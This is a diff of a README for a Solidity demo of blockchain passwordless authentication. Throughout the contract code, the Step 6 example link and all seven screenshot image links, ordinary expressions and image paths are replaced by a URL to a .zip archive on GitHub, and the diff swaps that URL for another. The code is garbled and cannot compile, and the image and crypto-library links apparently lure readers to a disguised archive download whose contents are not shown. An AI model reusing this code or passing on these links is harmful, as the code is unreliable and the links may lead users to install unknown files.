@@ -20,7 +20,7 @@ During login, the server (or smart contract) generates a random challenge messag
 The server sends the challenge to the user’s client-side application.
 
 ## Step 6:
-The user’s client-side application signs the challenge using their private key via cryptographic functions (e.g., https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip).
+The user’s client-side application signs the challenge using their private key via cryptographic functions (e.g., https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip).
 
 ## Step 7:
 The signed challenge (digital signature) is sent back to the server (or smart contract) for verification.
@@ -58,38 +58,38 @@ contract PasswordlessAuthDemo {
 
     // Step 1: Register user
     function registerUser() public {
-        require(!users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].registered, "Already registered");
+        require(!users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].registered, "Already registered");
 
         // Fake public/private keys
-        address fakePubKey = https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip;
-        bytes32 fakePrivateKey = keccak256(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip, https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip));
+        address fakePubKey = https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip;
+        bytes32 fakePrivateKey = keccak256(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip, https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip));
 
-        users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip] = User({
+        users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip] = User({
             registered: true,
             pubKey: fakePubKey,
             privateKey: fakePrivateKey
         });
 
-        emit UserRegistered(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip, fakePubKey, fakePrivateKey);
+        emit UserRegistered(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip, fakePubKey, fakePrivateKey);
     }
 
     // Step 2: Generate random challenge
     function generateChallenge() public returns (bytes32) {
-        require(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].registered, "User not registered");
-        latestChallenge = keccak256(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip, https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip));
+        require(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].registered, "User not registered");
+        latestChallenge = keccak256(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip, https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip));
         emit ChallengeGenerated(latestChallenge);
         return latestChallenge;
     }
 
     // Step 3: "Sign" the challenge (fake signing)
     function generateSignature() public returns (bytes32 hash, uint8 v, bytes32 r, bytes32 s) {
-        require(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].registered, "User not registered");
+        require(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].registered, "User not registered");
         
         hash = latestChallenge;
-        bytes32 combined = keccak256(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].privateKey, hash));
+        bytes32 combined = keccak256(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].privateKey, hash));
         
         // Fake values for r, s, v
-        r = bytes32(uint256(uint160(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].pubKey)) << 96);
+        r = bytes32(uint256(uint160(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].pubKey)) << 96);
         s = combined;
         v = 27;
 
@@ -100,10 +100,10 @@ contract PasswordlessAuthDemo {
 
     // Step 4: Authenticate
     function authenticate(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public view returns (bool) {
-        require(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].registered, "User not registered");
+        require(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].registered, "User not registered");
 
-        bytes32 expectedCombined = keccak256(https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].privateKey, hash));
-        bytes32 expectedR = bytes32(uint256(uint160(users[https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip].pubKey)) << 96);
+        bytes32 expectedCombined = keccak256(https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].privateKey, hash));
+        bytes32 expectedR = bytes32(uint256(uint160(users[https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip].pubKey)) << 96);
         uint8 expectedV = 27;
 
         if (r == expectedR && s == expectedCombined && v == expectedV) {
@@ -118,13 +118,13 @@ contract PasswordlessAuthDemo {
 # Output:
 
 
-![Screenshot 2025-04-28 144207](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
-![Screenshot 2025-04-28 144433](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
-![Screenshot 2025-04-28 144739](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
-![Screenshot 2025-04-28 144922](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
-![Screenshot 2025-04-28 145143](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
-![Screenshot 2025-04-28 144129](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
-![Screenshot 2025-04-28 144146](https://github.com/Yugabharathi91/19AI547-Blockchain-for-Business/raw/refs/heads/main/kung/Blockchain-A-Business-for-1.4.zip)
+![Screenshot 2025-04-28 144207](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
+![Screenshot 2025-04-28 144433](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
+![Screenshot 2025-04-28 144739](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
+![Screenshot 2025-04-28 144922](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
+![Screenshot 2025-04-28 145143](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
+![Screenshot 2025-04-28 144129](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
+![Screenshot 2025-04-28 144146](https://raw.githubusercontent.com/Yugabharathi91/19AI547-Blockchain-for-Business/main/kung/for-A-Business-Blockchain-2.9.zip)
 
 
 # High-Level Overview:
